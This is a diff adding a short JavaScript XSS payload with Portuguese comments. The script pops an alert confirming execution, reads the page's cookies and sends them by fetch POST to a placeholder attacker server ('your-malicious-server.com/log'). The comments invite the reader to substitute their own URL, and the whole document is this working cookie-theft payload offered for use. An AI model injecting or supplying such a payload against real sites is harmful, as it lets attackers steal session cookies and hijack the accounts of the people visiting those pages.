@@ -1,0 +1,21 @@
+<script>// script.js (arquivo remoto)
+    (function () {
+        // Mostra um alerta para confirmar que o script foi executado
+        alert('XSS executado com sucesso!');
+
+        // Tenta capturar os cookies da página (se acessíveis)
+        if (document.cookie) {
+            console.log('Cookies da página:', document.cookie);
+
+            // Opcional: enviar cookies para um servidor remoto controlado pelo atacante
+            // Exemplo (substitua pela sua URL):
+            fetch('https://your-malicious-server.com/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ cookies: document.cookie })
+            });
+        } else {
+            console.log('Nenhum cookie disponível.');
+        }
+    })();
+</script>
